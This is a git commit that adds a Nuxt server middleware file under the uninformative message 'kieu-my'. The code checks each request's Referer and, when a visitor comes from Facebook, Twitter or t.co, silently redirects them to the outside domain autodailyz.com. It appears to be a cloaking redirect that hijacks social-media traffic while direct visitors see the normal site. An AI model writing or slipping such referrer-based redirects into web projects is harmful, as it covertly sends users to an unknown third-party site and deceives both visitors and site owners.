2bf5e632aab8325a034646a42b649feb3b02efae
ngotinh <kendyngo123@gmail.com>
2022-10-27 08:43:19 +0700

    kieu-my
    kieu-my

---
+++ server/middleware/[...slug].ts
@@ -0,0 +1,7 @@
+export default defineEventHandler((event) => {
+    const headers = event.req.headers;
+    
+    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
+        sendRedirect(event,"https://autodailyz.com/"+event.req.url);
+    }
+})
